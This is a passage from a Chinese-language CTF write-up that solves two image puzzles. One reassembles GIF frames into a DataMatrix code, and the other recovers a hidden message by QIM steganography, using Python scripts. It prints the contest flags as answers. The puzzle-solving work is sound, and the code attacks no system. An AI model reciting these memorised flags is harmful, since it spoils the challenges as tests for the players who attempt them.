+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628043957019574/acb2f2d4b9866383393d8523ebe557185a893ead.png"></p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628043957089324/264269688a4baa36f4d0ac382f7d2428f1e6d43b.png"></p>
+<p>将得到的九张图片按顺序排好可得一个 DataMatrix 码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7 1 6</span></span><br><span class="line"><span class="comment"># 9 3 4</span></span><br><span class="line"><span class="comment"># 5 2 8</span></span><br><span class="line">pasteArray = [<span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">4</span>]</span><br><span class="line">resultImage = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">83</span> * <span class="number">3</span>, <span class="number">83</span> * <span class="number">3</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> group <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    imageModel = Image.<span class="built_in">open</span>(<span class="string">&quot;./gif/IMG&#123;:05d&#125;.bmp&quot;</span>.<span class="built_in">format</span>(group))</span><br><span class="line">    image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">83</span>, <span class="number">83</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    width, height = imageModel.size</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(group + <span class="number">11</span>, <span class="number">451</span>, <span class="number">11</span>):</span><br><span class="line">        imageSlice = Image.<span class="built_in">open</span>(<span class="string">&quot;./gif/IMG&#123;:05d&#125;.bmp&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">                <span class="keyword">if</span> imageModel.getpixel((y, x)) != imageSlice.getpixel((y, x)):</span><br><span class="line">                    <span class="built_in">print</span>(y, x)</span><br><span class="line">                    <span class="built_in">print</span>(imageModel.getpixel((y, x)), imageSlice.getpixel((y, x)))</span><br><span class="line">                    image.putpixel((y, x), (<span class="number">16</span>, <span class="number">63</span>, <span class="number">145</span>))</span><br><span class="line">    resultImage.paste(image, (</span><br><span class="line">        ((pasteArray[group] - <span class="number">1</span>) % <span class="number">3</span>) * <span class="number">83</span>, ((pasteArray[group] - <span class="number">1</span>) // <span class="number">3</span>) * <span class="number">83</span>,</span><br><span class="line">        ((pasteArray[group] - <span class="number">1</span>) % <span class="number">3</span>) * <span class="number">83</span> + <span class="number">83</span>,</span><br><span class="line">        ((pasteArray[group] - <span class="number">1</span>) // <span class="number">3</span>) * <span class="number">83</span> + <span class="number">83</span>))</span><br><span class="line">resultImage.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628044046032440/ca2d0d3cf3f4b90d86205296338807d85ccd3421.png@100w"></p>
+<p>识别这个码可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;6bb73086aeb764b5727529d82b084cce&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/abella/p/9982322.html">QIM量化 - 努力奋斗的阿贝拉</a></p>
+</blockquote>
+<p>StegSolve 的 Data Extract 导出 Green plane 0 的图片可得如下信息。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628073325447688/eb36c389b6ce0d68f826ff546207cd719c3c53c7.png"></p>
+<p>顺利得到了前一半的 flag <code>flag&#123;2e9ec6480d0515</code> 以及后一半使用了 delta 为 20 的 QIM 量化的提示。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/pl561/QuantizationIndexModulation/blob/master/qim.py">https://github.com/pl561/QuantizationIndexModulation/blob/master/qim.py</a></p>
+</blockquote>
+<p> 参考 GitHub 上的脚本写出如下脚本来提取出图片中的信息。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QIM</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, delta</span>):</span></span><br><span class="line">        self.delta = delta</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">embed</span>(<span class="params">self, x, m</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        x is a vector of values to be quantized individually</span></span><br><span class="line"><span class="string">        m is a binary vector of bits to be embeded</span></span><br><span class="line"><span class="string">        returns: a quantized vector y</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        x = x.astype(<span class="built_in">float</span>)</span><br><span class="line">        d = self.delta</span><br><span class="line">        y = np.<span class="built_in">round</span>(x / d) * d + (-<span class="number">1</span>) ** (m + <span class="number">1</span>) * d / <span class="number">4.</span></span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detect</span>(<span class="params">self, z</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        z is the received vector, potentially modified</span></span><br><span class="line"><span class="string">        returns: a detected vector z_detected and a detected message m_detected</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        shape = z.shape</span><br><span class="line">        z = z.flatten()</span><br><span class="line"></span><br><span class="line">        m_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line">        z_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line"></span><br><span class="line">        z0 = self.embed(z, <span class="number">0</span>)</span><br><span class="line">        z1 = self.embed(z, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        d0 = np.<span class="built_in">abs</span>(z - z0)</span><br><span class="line">        d1 = np.<span class="built_in">abs</span>(z - z1)</span><br><span class="line"></span><br><span class="line">        gen = <span class="built_in">zip</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(z_detected)), d0, d1)</span><br><span class="line">        <span class="keyword">for</span> i, dd0, dd1 <span class="keyword">in</span> gen:</span><br><span class="line">            <span class="keyword">if</span> dd0 &lt; dd1:</span><br><span class="line">                m_detected[i] = <span class="number">0</span></span><br><span class="line">                z_detected[i] = z0[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m_detected[i] = <span class="number">1</span></span><br><span class="line">                z_detected[i] = z1[i]</span><br><span class="line"></span><br><span class="line">        z_detected = z_detected.reshape(shape)</span><br><span class="line">        m_detected = m_detected.reshape(shape)</span><br><span class="line">        <span class="keyword">return</span> z_detected, m_detected.astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">qim = QIM(delta=<span class="number">20</span>)</span><br><span class="line">image = np.array(Image.<span class="built_in">open</span>(<span class="string">&quot;./ezSteganography-flag.png&quot;</span>))</span><br><span class="line">green = image[:, :, <span class="number">1</span>].ravel()</span><br><span class="line">[z_detected, msg_detected] = qim.detect(green)</span><br><span class="line">plt.imshow(msg_detected.reshape(<span class="number">1440</span>, <span class="number">2560</span>))</span><br><span class="line">plt.savefig(<span class="string">&quot;steganography.png&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本可以得到下图，从而获得后一半 flag <code>0c211963984dcbc9f1&#125;</code>。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v7